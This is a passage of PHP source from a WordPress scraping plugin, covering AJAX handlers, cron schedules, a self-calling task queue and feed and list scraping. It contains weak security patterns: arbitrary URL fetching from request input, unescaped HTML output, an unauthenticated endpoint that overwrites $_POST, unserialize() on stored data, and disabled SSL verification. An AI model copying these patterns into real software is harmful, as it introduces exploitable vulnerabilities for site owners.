		add_action("wp_ajax_" . "get_url", array($this, "ajax_url_load"));
		add_action("wp_ajax_" . "get_post_cats", array($this, "ajax_post_cats"));
		add_action("wp_ajax_" . "get_post_tax", array($this, "ajax_post_tax"));
		add_action("wp_ajax_" . "get_tasks", array($this, "ajax_tasks"));
	}
	
	public function ajax_tasks() {
		$all_tasks = get_posts(array(
			'numberposts' => -1, 'post_type' => 'scrape', 'post_status' => 'publish'
		));
		
		$array = array();
		foreach ($all_tasks as $task) {
			$post_ID = $task->ID;
			
			clean_post_cache($post_ID);
			$post_status = get_post_status($post_ID);
			$scrape_status = get_post_meta($post_ID, 'scrape_workstatus', true);
			$run_limit = get_post_meta($post_ID, 'scrape_run_limit', true);
			$run_count = get_post_meta($post_ID, 'scrape_run_count', true);
			$run_unlimited = get_post_meta($post_ID, 'scrape_run_unlimited', true);
			$status = '';
			$css_class = '';
			
			if ($post_status == 'trash') {
				$status = __("Deactivated", "ol-scrapes");
				$css_class = "deactivated";
			} else {
				if ($run_count == 0 && $scrape_status == 'waiting') {
					$status = __("Preparing", "ol-scrapes");
					$css_class = "preparing";
				} else {
					if ((!empty($run_unlimited) || $run_count < $run_limit) && $scrape_status == 'waiting') {
						$status = __("Waiting next run", "ol-scrapes");
						$css_class = "wait_next";
					} else {
						if (((!empty($run_limit) && $run_count < $run_limit) || (!empty($run_unlimited))) && $scrape_status == 'running') {
							$status = __("Running", "ol-scrapes");
							$css_class = "running";
						} else {
							if (empty($run_unlimited) && $run_count == $run_limit && $scrape_status == 'waiting') {
								$status = __("Complete", "ol-scrapes");
								$css_class = "complete";
							}
						}
					}
				}
			}
			
			$last_run = get_post_meta($post_ID, 'scrape_start_time', true) != "" ? get_post_meta($post_ID, 'scrape_start_time', true) : __("None", "ol-scrapes");
			$last_complete = get_post_meta($post_ID, 'scrape_end_time', true) != "" ? get_post_meta($post_ID, 'scrape_end_time', true) : __("None", "ol-scrapes");
			$last_scrape = get_post_meta($post_ID, 'scrape_last_scrape', true) != "" ? get_post_meta($post_ID, 'scrape_last_scrape', true) : __("None", "ol-scrapes");
			$run_count_progress = $run_count;
			if ($run_unlimited == "") {
				$run_count_progress .= " / " . $run_limit;
			}
			$offset = get_option('gmt_offset') * 3600;
			$date = date("Y-m-d H:i:s", wp_next_scheduled("scrape_event", array($post_ID)) + $offset);
			if (strpos($date, "1970-01-01") !== false) {
				$date = __("No Schedule", "ol-scrapes");
			}
			$array[] = array(
				$task->ID, $css_class, $status, $last_run, $last_complete, $date, $run_count_progress, $last_scrape
			);
		}
		
		echo json_encode($array);
		wp_die();
	}
	
	public function ajax_post_cats() {
		if (isset($_POST['post_type'])) {
			$post_type = $_POST['post_type'];
			$object_taxonomies = get_object_taxonomies($post_type);
			if (!empty($object_taxonomies)) {
				$cats = get_categories(array(
					'hide_empty' => 0, 'taxonomy' => array_diff($object_taxonomies, array('post_tag')), 'type' => $post_type
				));
			} else {
				$cats = array();
			}
			$scrape_category = get_post_meta($_POST['post_id'], 'scrape_category', true);
			foreach ($cats as $c) {
				echo '<div class="checkbox"><label><input type="checkbox" name="scrape_category[]" value="' . $c->cat_ID . '"' . (!empty($scrape_category) && in_array($c->cat_ID, $scrape_category) ? " checked" : "") . '> ' . $c->name . '<small> (' . get_taxonomy($c->taxonomy)->labels->name . ')</small></label></div>';
			}
			wp_die();
		}
	}
	
	public function ajax_post_tax() {
		if (isset($_POST['post_type'])) {
			$post_type = $_POST['post_type'];
			$object_taxonomies = get_object_taxonomies($post_type, "objects");
			unset($object_taxonomies['post_tag']);
			$scrape_categoryxpath_tax = get_post_meta($_POST['post_id'], 'scrape_categoryxpath_tax', true);
			foreach ($object_taxonomies as $tax) {
				echo "<option value='$tax->name'" . ($tax->name == $scrape_categoryxpath_tax ? " selected" : "") . " >" . $tax->labels->name . "</option>";
			}
			wp_die();
		}
	}
	
	public function ajax_url_load() {
		if (isset($_GET['address'])) {
			
			update_site_option('scrape_user_agent', $_SERVER['HTTP_USER_AGENT']);
			$args = $this->return_html_args();
			
			
			if (isset($_GET['scrape_feed'])) {
				$response = wp_remote_get($_GET['address'], $args);
				$body = wp_remote_retrieve_body($response);
				$charset = $this->detect_feed_encoding_and_replace(wp_remote_retrieve_header($response, "Content-Type"), $body, true);
				$body = iconv($charset, "UTF-8//IGNORE", $body);
				if (function_exists("tidy_repair_string")) {
					$body = tidy_repair_string($body, array(
						'output-xml' => true, 'input-xml' => true
					), 'utf8');
				}
				if ($body === false) {
					wp_die("utf 8 convert error");
				}
				$xml = simplexml_load_string($body);
				if ($xml === false) {
					$this->write_log(libxml_get_errors(), true);
					libxml_clear_errors();
				}
				$feed_type = $xml->getName();
				$this->write_log("feed type is : " . $feed_type);
				if ($feed_type == 'rss') {
					$items = $xml->channel->item;
					$_GET['address'] = strval($items[0]->link);
				} else {
					if ($feed_type == 'feed') {
						$items = $xml->entry;
						$alternate_found = false;
						foreach ($items[0]->link as $link) {
							if ($link->attributes()->rel == "alternate") {
								$_GET['address'] = strval($link->attributes()->href);
								$alternate_found = true;
							}
						}
						if (!$alternate_found) {
							$_GET['address'] = strval($items[0]->link->attributes()->href);
						}
					} else {
						if ($feed_type == 'RDF') {
							$items = $xml->item;
							$_GET['address'] = strval($items[0]->link);
						}
					}
				}
				$_GET['address'] = trim($_GET['address']);
				$this->write_log("first item in rss: " . $_GET['address']);
			}
			
			$request = wp_remote_get($_GET['address'], $args);
			if (is_wp_error($request)) {
				wp_die($request->get_error_message());
			}
			$body = wp_remote_retrieve_body($request);
			$body = trim($body);
			if (substr($body, 0, 3) == pack("CCC", 0xef, 0xbb, 0xbf)) {
				$body = substr($body, 3);
			}
			$dom = new DOMDocument();
			$dom->preserveWhiteSpace = false;
			
			$charset = $this->detect_html_encoding_and_replace(wp_remote_retrieve_header($request, "Content-Type"), $body, true);
			$body = iconv($charset, "UTF-8//IGNORE", $body);
			
			if ($body === false) {
				wp_die("utf-8 convert error");
			}
			
			$body = preg_replace(array(
				"'<\s*script[^>]*[^/]>(.*?)<\s*/\s*script\s*>'isu", "'<\s*script\s*>(.*?)<\s*/\s*script\s*>'isu", "'<\s*noscript[^>]*[^/]>(.*?)<\s*/\s*noscript\s*>'isu", "'<\s*noscript\s*>(.*?)<\s*/\s*noscript\s*>'isu"
			), array(
				"", "", "", ""
			), $body);
			
			$body = mb_convert_encoding($body, 'HTML-ENTITIES', 'UTF-8');
			@$dom->loadHTML('<?xml encoding="utf-8" ?>' . $body);
			$url = parse_url($_GET['address']);
			$url = $url['scheme'] . "://" . $url['host'];
			$base = $dom->getElementsByTagName('base')->item(0);
			$html_base_url = null;
			if (!is_null($base)) {
				$html_base_url = $this->create_absolute_url($base->getAttribute('href'), $url, null);
			}
			
			
			$imgs = $dom->getElementsByTagName('img');
			if ($imgs->length) {
				foreach ($imgs as $item) {
					if ($item->getAttribute('src') != '') {
						$item->setAttribute('src', $this->create_absolute_url(trim($item->getAttribute('src')), $_GET['address'], $html_base_url));
					}
				}
			}
			
			$as = $dom->getElementsByTagName('a');
			if ($as->length) {
				foreach ($as as $item) {
					if ($item->getAttribute('href') != '') {
						$item->setAttribute('href', $this->create_absolute_url(trim($item->getAttribute('href')), $_GET['address'], $html_base_url));
					}
				}
			}
			
			$links = $dom->getElementsByTagName('link');
			if ($links->length) {
				foreach ($links as $item) {
					if ($item->getAttribute('href') != '') {
						$item->setAttribute('href', $this->create_absolute_url(trim($item->getAttribute('href')), $_GET['address'], $html_base_url));
					}
				}
			}
			
			$all_elements = $dom->getElementsByTagName('*');
			foreach ($all_elements as $item) {
				if ($item->hasAttributes()) {
					foreach ($item->attributes as $name => $attr_node) {
						if (preg_match("/^on\w+$/", $name)) {
							$item->removeAttribute($name);
						}
					}
				}
			}
			
			$html = $dom->saveHTML();
			echo $html;
			wp_die();
		}
	}
	
	public function create_cron_schedules() {
		add_filter('cron_schedules', array($this, 'add_custom_schedules'), 999, 1);
		add_action('scrape_event', array($this, 'execute_post_task'));
	}
	
	public function add_custom_schedules($schedules) {
		$schedules['scrape_' . "5 Minutes"] = array(
			'interval' => 5 * 60, 'display' => __("Every 5 minutes", "ol-scrapes")
		);
		$schedules['scrape_' . "10 Minutes"] = array(
			'interval' => 10 * 60, 'display' => __("Every 10 minutes", "ol-scrapes")
		);
		$schedules['scrape_' . "15 Minutes"] = array(
			'interval' => 15 * 60, 'display' => __("Every 15 minutes", "ol-scrapes")
		);
		$schedules['scrape_' . "30 Minutes"] = array(
			'interval' => 30 * 60, 'display' => __("Every 30 minutes", "ol-scrapes")
		);
		$schedules['scrape_' . "45 Minutes"] = array(
			'interval' => 45 * 60, 'display' => __("Every 45 minutes", "ol-scrapes")
		);
		$schedules['scrape_' . "1 Hour"] = array(
			'interval' => 60 * 60, 'display' => __("Every hour", "ol-scrapes")
		);
		$schedules['scrape_' . "2 Hours"] = array(
			'interval' => 2 * 60 * 60, 'display' => __("Every 2 hours", "ol-scrapes")
		);
		$schedules['scrape_' . "4 Hours"] = array(
			'interval' => 4 * 60 * 60, 'display' => __("Every 4 hours", "ol-scrapes")
		);
		$schedules['scrape_' . "6 Hours"] = array(
			'interval' => 6 * 60 * 60, 'display' => __("Every 6 hours", "ol-scrapes")
		);
		$schedules['scrape_' . "8 Hours"] = array(
			'interval' => 8 * 60 * 60, 'display' => __("Every 8 hours", "ol-scrapes")
		);
		$schedules['scrape_' . "12 Hours"] = array(
			'interval' => 12 * 60 * 60, 'display' => __("Every 12 hours", "ol-scrapes")
		);
		$schedules['scrape_' . "1 Day"] = array(
			'interval' => 24 * 60 * 60, 'display' => __("Every day", "ol-scrapes")
		);
		$schedules['scrape_' . "2 Days"] = array(
			'interval' => 2 * 24 * 60 * 60, 'display' => __("Every 2 days", "ol-scrapes")
		);
		$schedules['scrape_' . "3 Days"] = array(
			'interval' => 3 * 24 * 60 * 60, 'display' => __("Every 3 days", "ol-scrapes")
		);
		$schedules['scrape_' . "1 Week"] = array(
			'interval' => 7 * 24 * 60 * 60, 'display' => __("Every week", "ol-scrapes")
		);
		$schedules['scrape_' . "2 Weeks"] = array(
			'interval' => 2 * 7 * 24 * 60 * 60, 'display' => __("Every 2 weeks", "ol-scrapes")
		);
		$schedules['scrape_' . "1 Month"] = array(
			'interval' => 30 * 24 * 60 * 60, 'display' => __("Every month", "ol-scrapes")
		);
		
		return $schedules;
	}
	
	public static function handle_cron_job($post_id) {
		$cron_recurrence = get_post_meta($post_id, 'scrape_recurrence', true);
		$timestamp = wp_next_scheduled('scrape_event', array($post_id));
		if ($timestamp) {
			//wp_unschedule_event($timestamp, 'scrape_event', array($post_id));
			wp_clear_scheduled_hook('scrape_event', array($post_id));
		}

        $first_run = get_post_meta($post_id, 'scrape_first_run_time', true);
        $first_run = explode('hour_', $first_run);

		$schedule_res = wp_schedule_event(time() + ($first_run[1] * 3600) + 10, $cron_recurrence, "scrape_event", array($post_id));
		if ($schedule_res === false) {
			self::write_log("$post_id task can not be added to wordpress schedule. Please save post again later.", true);
		}
	}
	
	public function process_task_queue() {
		$this->write_log('process task queue called');
		
		
		if (function_exists('set_time_limit')) {
			$success = @set_time_limit(0);
			if (!$success) {
				if (function_exists('ini_set')) {
					$success = @ini_set('max_execution_time', 0);
					if (!$success) {
						$this->write_log("Preventing timeout can not be succeeded", true);
					}
				} else {
					$this->write_log('ini_set does not exist.', true);
				}
			}
		} else {
			$this->write_log('set_time_limit does not exist.', true);
		}
		
		session_write_close();
		
		if (isset($_REQUEST['post_id']) && get_post_meta($_REQUEST['post_id'], 'scrape_nonce', true) === $_REQUEST['nonce']) {
			$this->write_log("process_task_queue starts");
			$this->write_log("max_execution_time: " . ini_get('max_execution_time'));
			
			$post_id = $_REQUEST['post_id'];
			self::$task_id = $post_id;

//			if(get_transient('lock_' . $post_id)) {
//			    $this->write_log('another lock is set', true);
//			    wp_die();
//            }
//
//            set_transient('lock_' . $post_id, true);
			
			$_POST = $_REQUEST['variables'];
			clean_post_cache($post_id);
			$process_queue = get_post_meta($post_id, 'scrape_queue', true);
			$meta_vals = $process_queue['meta_vals'];
			$first_item = array_shift($process_queue['items']);
			
			if ($this->check_terminate($process_queue['start_time'], $process_queue['modify_time'], $post_id)) {
				
				if (empty($meta_vals['scrape_run_unlimited'][0]) && get_post_meta($post_id, 'scrape_run_count', true) >= get_post_meta($post_id, 'scrape_run_limit', true)) {
					$timestamp = wp_next_scheduled("scrape_event", array($post_id));
					wp_unschedule_event($timestamp, "scrape_event", array($post_id));
					wp_clear_scheduled_hook("scrape_event", array($post_id));
				}
				
				$this->write_log("$post_id id task ended");
				return;
			}
			
			$this->write_log("repeat count:" . $process_queue['repeat_count']);
			$this->single_scrape($first_item['url'], $process_queue['meta_vals'], $process_queue['repeat_count'], $first_item['rss_item']);
			$process_queue['number_of_posts'] += 1;
			$this->write_log("number of posts: " . $process_queue['number_of_posts']);
			
			$end_of_posts = false;
			$post_limit_reached = false;
			$repeat_limit_reached = false;
			
			if (count($process_queue['items']) == 0 && !empty($process_queue['next_page'])) {
				$args = $this->return_html_args($meta_vals);
				$response = wp_remote_get($process_queue['next_page'], $args);
				update_post_meta($post_id, 'scrape_last_url', $process_queue['next_page']);
				
				if (!isset($response->errors)) {
					
					$process_queue['page_no'] += 1;
					
					$body = wp_remote_retrieve_body($response);
					$body = trim($body);
					
					if (substr($body, 0, 3) == pack("CCC", 0xef, 0xbb, 0xbf)) {
						$body = substr($body, 3);
					}
					
					$charset = $this->detect_html_encoding_and_replace(wp_remote_retrieve_header($response, "Content-Type"), $body);
					$body_iconv = iconv($charset, "UTF-8//IGNORE", $body);
					
					$body_preg = '<?xml encoding="utf-8" ?>' . preg_replace(array(
							"/<!--.*?-->/isu", '/(<table([^>]+)?>([^<>]+)?)(?!<tbody([^>]+)?>)/isu', '/(<(?!(\/tbody))([^>]+)?>)(<\/table([^>]+)?>)/isu', "'<\s*script[^>]*[^/]>(.*?)<\s*/\s*script\s*>'isu", "'<\s*script\s*>(.*?)<\s*/\s*script\s*>'isu", "'<\s*noscript[^>]*[^/]>(.*?)<\s*/\s*noscript\s*>'isu", "'<\s*noscript\s*>(.*?)<\s*/\s*noscript\s*>'isu",
						
						), array(
							"", '$1<tbody>', '$1</tbody>$4', "", "", "", ""
						), $body_iconv);
					
					$doc = new DOMDocument;
					$doc->preserveWhiteSpace = false;
					$body_preg = mb_convert_encoding($body_preg, 'HTML-ENTITIES', 'UTF-8');
					@$doc->loadHTML($body_preg);
					
					$url = parse_url($first_item['url']);
					$url = $url['scheme'] . "://" . $url['host'];
					$base = $doc->getElementsByTagName('base')->item(0);
					$html_base_url = null;
					if (!is_null($base)) {
						$html_base_url = $this->create_absolute_url($base->getAttribute('href'), $url, null);
					}
					
					$xpath = new DOMXPath($doc);
					
					$next_buttons = (!empty($meta_vals['scrape_nextpage'][0]) ? $xpath->query($meta_vals['scrape_nextpage'][0]) : new DOMNodeList);
					
					$next_button = false;
					$is_facebook_page = false;
					
					if (parse_url($meta_vals['scrape_url'][0], PHP_URL_HOST) == 'mbasic.facebook.com') {
						$is_facebook_page = true;
					}
					
					$ref_a_element = $xpath->query($meta_vals['scrape_listitem'][0])->item(0);
					if (is_null($ref_a_element)) {
						$this->write_log("Reference a element not found URL:" . $meta_vals['scrape_url'][0] . " XPath: " . $meta_vals['scrape_listitem'][0]);
                        update_post_meta($post_id, 'scrape_workstatus', 'waiting');
                        update_post_meta($post_id, "scrape_end_time", current_time('mysql'));
                        delete_post_meta($post_id, 'scrape_last_url');

                        if (empty($meta_vals['scrape_run_unlimited'][0]) && get_post_meta($post_id, 'scrape_run_count', true) >= get_post_meta($post_id, 'scrape_run_limit', true)) {
                            $timestamp = wp_next_scheduled("scrape_event", array($post_id));
                            wp_unschedule_event($timestamp, "scrape_event", array($post_id));
                            wp_clear_scheduled_hook("scrape_event", array($post_id));
                            $this->write_log("run count reached, deleting task from schedules.");
                        }
                        $this->write_log("$post_id task ended");
						return;
					}
					$ref_node_path = $ref_a_element->getNodePath();
					$ref_node_no_digits = preg_replace("/\[\d+\]/", "", $ref_node_path);
					$ref_a_children = array();
					foreach ($ref_a_element->childNodes as $node) {
						$ref_a_children[] = $node->nodeName;
					}
					
					$this->write_log("scraping page #" . $process_queue['page_no']);
					
					$all_links = $xpath->query("//a");
					if ($is_facebook_page) {
						$all_links = $xpath->query("//a[text()='" . trim($ref_a_element->textContent) . "']");
					} else {
						if (!empty($meta_vals['scrape_exact_match'][0])) {
							$all_links = $xpath->query($meta_vals['scrape_listitem'][0]);
						}
					}
					
					$single_links = array();
					if (empty($meta_vals['scrape_exact_match'][0])) {
						$this->write_log("serial fuzzy match links");
						foreach ($all_links as $a_elem) {
							
							$parent_path = $a_elem->getNodePath();
							$parent_path_no_digits = preg_replace("/\[\d+\]/", "", $parent_path);
							if ($parent_path_no_digits == $ref_node_no_digits) {
								$children_node_names = array();
								foreach ($a_elem->childNodes as $node) {
									$children_node_names[] = $node->nodeName;
								}
								if ($ref_a_children === $children_node_names) {
									$single_links[] = $a_elem->getAttribute('href');
								}
							}
						}
					} else {
						$this->write_log("serial exact match links");
						foreach ($all_links as $a_elem) {
							$single_links[] = $a_elem->getAttribute('href');
						}
					}
					
					$single_links = array_unique($single_links);
					$this->write_log("number of links:" . count($single_links));
					foreach ($single_links as $k => $single_link) {
						$process_queue['items'][] = array(
							'url' => $this->create_absolute_url($single_link, $meta_vals['scrape_url'][0], $html_base_url), 'rss_item' => null
						);
					}
					if($meta_vals['scrape_nextpage_type'][0] == 'source') {
                        $this->write_log('checking candidate next buttons');
                        foreach ($next_buttons as $btn) {
                            $next_button_text = preg_replace("/\s+/", " ", $btn->textContent);
                            $next_button_text = str_replace(chr(0xC2) . chr(0xA0), " ", $next_button_text);

                            if ($next_button_text == $meta_vals['scrape_nextpage_innerhtml'][0]) {
                                $this->write_log("next page found");
                                $next_button = $btn;
                            }
                        }

                        $next_link = null;
                        if ($next_button) {
                            $next_link = $this->create_absolute_url($next_button->getAttribute('href'), $meta_vals['scrape_url'][0], $html_base_url);
                        }
                    } else {
                        $query = parse_url($meta_vals['scrape_url'][0], PHP_URL_QUERY);
                        $names = unserialize($meta_vals['scrape_next_page_url_parameters_names'][0]);
                        $values = unserialize($meta_vals['scrape_next_page_url_parameters_values'][0]);
                        $increments = unserialize($meta_vals['scrape_next_page_url_parameters_increments'][0]);

                        $build_query = array();

                        for($i = 0; $i < count($names); $i++) {
                            $build_query[$names[$i]] = $values[$i] + ($increments[$i] * ($process_queue['page_no']));
                        }
                        if ($query) {
                            $next_link = $meta_vals['scrape_url'][0] . "&" . http_build_query($build_query);
                        } else {
                            $next_link = $meta_vals['scrape_url'][0] . "?" . http_build_query($build_query);
                        }
                    }
					
					
					$this->write_log("next link is: " . $next_link);
					$process_queue['next_page'] = $next_link;
				} else {
					return;
				}
			}
			
			if (count($process_queue['items']) == 0 && empty($process_queue['next_page'])) {
				$end_of_posts = true;
				$this->write_log("end of posts.");
			}
			if (empty($meta_vals['scrape_post_unlimited'][0]) && !empty($meta_vals['scrape_post_limit'][0]) && $process_queue['number_of_posts'] == $meta_vals['scrape_post_limit'][0]) {
				$post_limit_reached = true;
				$this->write_log("post limit reached.");
			}
			$this->write_log("repeat count: " . $process_queue['repeat_count']);
			if (!empty($meta_vals['scrape_finish_repeat']) && $process_queue['repeat_count'] == $meta_vals['scrape_finish_repeat'][0]) {
				$repeat_limit_reached = true;
				$this->write_log("enable loop repeat limit reached.");
			}
			
			if ($end_of_posts || $post_limit_reached || $repeat_limit_reached) {
				update_post_meta($post_id, 'scrape_workstatus', 'waiting');
				update_post_meta($post_id, "scrape_end_time", current_time('mysql'));
				delete_post_meta($post_id, 'scrape_last_url');
				
				if (empty($meta_vals['scrape_run_unlimited'][0]) && get_post_meta($post_id, 'scrape_run_count', true) >= get_post_meta($post_id, 'scrape_run_limit', true)) {
					$timestamp = wp_next_scheduled("scrape_event", array($post_id));
					wp_unschedule_event($timestamp, "scrape_event", array($post_id));
					wp_clear_scheduled_hook("scrape_event", array($post_id));
					$this->write_log("run count reached, deleting task from schedules.");
				}
				$this->write_log("$post_id task ended");
				return;
			}
			
			update_post_meta($post_id, 'scrape_queue', wp_slash($process_queue));
			
			sleep($meta_vals['scrape_waitpage'][0]);
			$nonce = wp_create_nonce('process_task_queue');
			update_post_meta($post_id, 'scrape_nonce', $nonce);
//			delete_transient('lock_' . $post_id);
			wp_remote_get(add_query_arg(array(
				'action' => 'process_task_queue', 'nonce' => $nonce, 'post_id' => $post_id, 'variables' => $_POST
			), admin_url('admin-ajax.php')), array(
				'timeout' => 3, 'blocking' => false, 'sslverify' => false,
			));
			$this->write_log("non blocking admin ajax called exiting");
		} else {
			$this->write_log('nonce failed, not trusted request');
		}
		wp_die();
	}
	
	public function queue() {
		add_action('wp_ajax_nopriv_' . 'process_task_queue', array($this, 'process_task_queue'));
	}
	
	public function execute_post_task($post_id) {
		global $meta_vals;

		if ($this->validate()) {
			${"GLOBALS"}["dksfkn"] = "post_id";
			${"GLOBALS"}["unlvnrgtpgv"] = "task_id";
			self::${
				${"GLOBALS"}["unlvnrgtpgv"]
			} = ${${"GLOBALS"}["dksfkn"]
		};
		}
		
		$this->write_log("$post_id id task starting...");
		clean_post_cache($post_id);
		clean_post_meta($post_id);
		
		if (empty($meta_vals['scrape_run_unlimited'][0]) && !empty($meta_vals['scrape_run_count']) && !empty($meta_vals['scrape_run_limit']) && $meta_vals['scrape_run_count'][0] >= $meta_vals['scrape_run_limit'][0]) {
			$this->write_log("run count limit reached. task returns");
			return;
		}
		if (!empty($meta_vals['scrape_workstatus']) && $meta_vals['scrape_workstatus'][0] == 'running' && $meta_vals['scrape_stillworking'][0] == 'wait') {
			$this->write_log($post_id . " wait until finish is selected. returning");
			return;
		}
		
		$start_time = current_time('mysql');
		$modify_time = get_post_modified_time('U', null, $post_id);
		update_post_meta($post_id, "scrape_start_time", $start_time);
		update_post_meta($post_id, "scrape_end_time", '');
		update_post_meta($post_id, 'scrape_workstatus', 'running');
		$queue_items = array(
			'items' => array(), 'meta_vals' => $meta_vals, 'repeat_count' => 0, 'number_of_posts' => 0, 'page_no' => 1, 'start_time' => $start_time, 'modify_time' => $modify_time, 'next_page' => null
		);
		
		if ($meta_vals['scrape_type'][0] == 'single') {
			$queue_items['items'][] = array(
				'url' => $meta_vals['scrape_url'][0], 'rss_item' => null
			);
			update_post_meta($post_id, 'scrape_queue', wp_slash($queue_items));
		} else {
			if ($meta_vals['scrape_type'][0] == 'feed') {
				$this->write_log("rss xml download");
				$args = $this->return_html_args($meta_vals);
				$url = $meta_vals['scrape_url'][0];
				$response = wp_remote_get($url, $args);
				if (!isset($response->errors)) {
					$body = wp_remote_retrieve_body($response);
					$charset = $this->detect_feed_encoding_and_replace(wp_remote_retrieve_header($response, "Content-Type"), $body);
					$body = iconv($charset, "UTF-8//IGNORE", $body);
					if ($body === false) {
						$this->write_log("UTF8 Convert error from charset:" . $charset);
					}
					
					if (function_exists('tidy_repair_string')) {
						$body = tidy_repair_string($body, array(
							'output-xml' => true, 'input-xml' => true
						), 'utf8');
					}
					
					$xml = simplexml_load_string($body);
					
					if ($xml === false) {
						$this->write_log(libxml_get_errors(), true);
						libxml_clear_errors();
					}
					
					$namespaces = $xml->getNamespaces(true);
					
					$feed_type = $xml->getName();
					
					$feed_image = '';
					if ($feed_type == 'rss') {
						$items = $xml->channel->item;
						if (isset($xml->channel->image)) {
							$feed_image = $xml->channel->image->url;
						}
					} else {
						if ($feed_type == 'feed') {
							$items = $xml->entry;
							$feed_image = (!empty($xml->logo) ? $xml->logo : $xml->icon);
						} else {
							if ($feed_type == 'RDF') {
								$items = $xml->item;
								$feed_image = $xml->channel->image->attributes($namespaces['rdf'])->resource;
							}
						}
					}

					foreach ($items as $item) {
						
						$post_date = '';
						if ($feed_type == 'rss') {
							$post_date = $item->pubDate;
						} else {
							if ($feed_type == 'feed') {
								$post_date = $item->published;
							} else {
								if ($feed_type == 'RDF') {
									$post_date = $item->children($namespaces['dc'])->date;
								}
							}
						}
						
						$post_date = date('Y-m-d H:i:s', strtotime($post_date));
						
						if ($feed_type != 'feed') {
							$post_content = html_entity_decode($item->description, ENT_COMPAT, "UTF-8");
							$original_html_content = $post_content;
						} else {
							$post_content = html_entity_decode($item->content, ENT_COMPAT, "UTF-8");
							$original_html_content = $post_content;
						}
						
						if ($meta_vals['scrape_allowhtml'][0] != 'on') {
							$post_content = wp_strip_all_tags($post_content);
						}
						
						$post_content = trim($post_content);
						
						if (isset($namespaces['media'])) {
							$media = $item->children($namespaces['media']);
						} else {
							$media = $item->children();
						}
						
						if (isset($media->content) && $feed_type != 'feed') {
							$this->write_log("image from media:content");
							$url = (string)$media->content->attributes()->url;
							$featured_image_url = $url;
						} else {
							if (isset($media->thumbnail)) {
								$this->write_log("image from media:thumbnail");
								$url = (string)$media->thumbnail->attributes()->url;
								$featured_image_url = $url;
							} else {
								if (isset($item->enclosure)) {
									$this->write_log("image from enclosure");
									$url = (string)$item->enclosure['url'];
									$featured_image_url = $url;
								} else {
									if (isset($item->description) || (isset($item->content) && $feed_type == 'feed')) {
										$item_content = (isset($item->description) ? $item->description : $item->content);
										//$this->write_log("image from description");
										$doc = new DOMDocument();
										$doc->preserveWhiteSpace = false;
										@$doc->loadHTML('<?xml encoding="utf-8" ?>' . html_entity_decode($item_content));
										
										$imgs = $doc->getElementsByTagName('img');
										
										if ($imgs->length) {
											$featured_image_url = $imgs->item(0)->attributes->getNamedItem('src')->nodeValue;
										}
									} else {
										if (!empty($feed_image)) {
											$this->write_log("image from channel");
											$featured_image_url = $feed_image;
										}
									}
								}
							}
						}
						
						$rss_item = array(
							'post_date' => strval($post_date), 'post_content' => strval($post_content), 'post_original_content' => $original_html_content, 'featured_image' => $this->create_absolute_url(strval($featured_image_url), $url, null), 'post_title' => strval($item->title)
						);
						if ($feed_type == 'feed') {
							$alternate_found = false;
							foreach ($item->link as $link) {
								$this->write_log($link->attributes()->rel);
								if ($link->attributes()->rel == 'alternate') {
									$single_url = strval($link->attributes()->href);
									$this->write_log('found alternate attribute link: ' . $single_url);
									$alternate_found = true;
								}
							}
							if (!$alternate_found) {
								$single_url = strval($item->link->attributes()->href);
							}
						} else {
							$single_url = strval($item->link);
						}
						
						$queue_items['items'][] = array(
							'url' => $single_url, 'rss_item' => $rss_item
						);
					}
					
					update_post_meta($post_id, 'scrape_queue', wp_slash($queue_items));
				} else {
					$this->write_log($post_id . " http error:" . $response->get_error_message());
					if ($meta_vals['scrape_onerror'][0] == 'stop') {
						$this->write_log($post_id . " on error chosen stop. returning code " . $response->get_error_message(), true);
						return;
					}
				}
			} else {
				if ($meta_vals['scrape_type'][0] == 'list') {
					$args = $this->return_html_args($meta_vals);
					if (!empty($meta_vals['scrape_last_url']) && $meta_vals['scrape_run_type'][0] == 'continue') {
						$this->write_log("continues from last stopped url" . $meta_vals['scrape_last_url'][0]);
						$meta_vals['scrape_url'][0] = $meta_vals['scrape_last_url'][0];
					}
					
					$this->write_log("Serial scrape starts at URL:" . $meta_vals['scrape_url'][0]);
					
					$response = wp_remote_get($meta_vals['scrape_url'][0], $args);
					update_post_meta($post_id, 'scrape_last_url', $meta_vals['scrape_url'][0]);
					
					if (!isset($response->errors)) {
						$body = wp_remote_retrieve_body($response);
						$body = trim($body);
						
						if (substr($body, 0, 3) == pack("CCC", 0xef, 0xbb, 0xbf)) {
							$body = substr($body, 3);
						}
						
						$charset = $this->detect_html_encoding_and_replace(wp_remote_retrieve_header($response, "Content-Type"), $body);
						$body_iconv = iconv($charset, "UTF-8//IGNORE", $body);
						
						$body_preg = '<?xml encoding="utf-8" ?>' . preg_replace(array(
								"/<!--.*?-->/isu", '/(<table([^>]+)?>([^<>]+)?)(?!<tbody([^>]+)?>)/isu', '/(<(?!(\/tbody))([^>]+)?>)(<\/table([^>]+)?>)/isu', "'<\s*script[^>]*[^/]>(.*?)<\s*/\s*script\s*>'isu", "'<\s*script\s*>(.*?)<\s*/\s*script\s*>'isu", "'<\s*noscript[^>]*[^/]>(.*?)<\s*/\s*noscript\s*>'isu", "'<\s*noscript\s*>(.*?)<\s*/\s*noscript\s*>'isu",
							
							), array(
								"", '$1<tbody>', '$1</tbody>$4', "", "", "", ""
							), $body_iconv);
						
						$doc = new DOMDocument;
						$doc->preserveWhiteSpace = false;
						$body_preg = mb_convert_encoding($body_preg, 'HTML-ENTITIES', 'UTF-8');
						@$doc->loadHTML($body_preg);
						
						$url = parse_url($meta_vals['scrape_url'][0]);
						$url = $url['scheme'] . "://" . $url['host'];
						$base = $doc->getElementsByTagName('base')->item(0);
						$html_base_url = null;
						if (!is_null($base)) {
							$html_base_url = $this->create_absolute_url($base->getAttribute('href'), $url, null);
						}
						
						$xpath = new DOMXPath($doc);
						
						$next_buttons = (!empty($meta_vals['scrape_nextpage'][0]) ? $xpath->query($meta_vals['scrape_nextpage'][0]) : new DOMNodeList);
						
						$next_button = false;
						$is_facebook_page = false;
						
						if (parse_url($meta_vals['scrape_url'][0], PHP_URL_HOST) == 'mbasic.facebook.com') {
							$is_facebook_page = true;
						}
						
						$ref_a_element = $xpath->query($meta_vals['scrape_listitem'][0])->item(0);
						if (is_null($ref_a_element)) {
							$this->write_log("Reference a element not found URL:" . $meta_vals['scrape_url'][0] . " XPath: " . $meta_vals['scrape_listitem'][0]);
                            update_post_meta($post_id, 'scrape_workstatus', 'waiting');
                            update_post_meta($post_id, "scrape_end_time", current_time('mysql'));
                            delete_post_meta($post_id, 'scrape_last_url');

                            if (empty($meta_vals['scrape_run_unlimited'][0]) && get_post_meta($post_id, 'scrape_run_count', true) >= get_post_meta($post_id, 'scrape_run_limit', true)) {
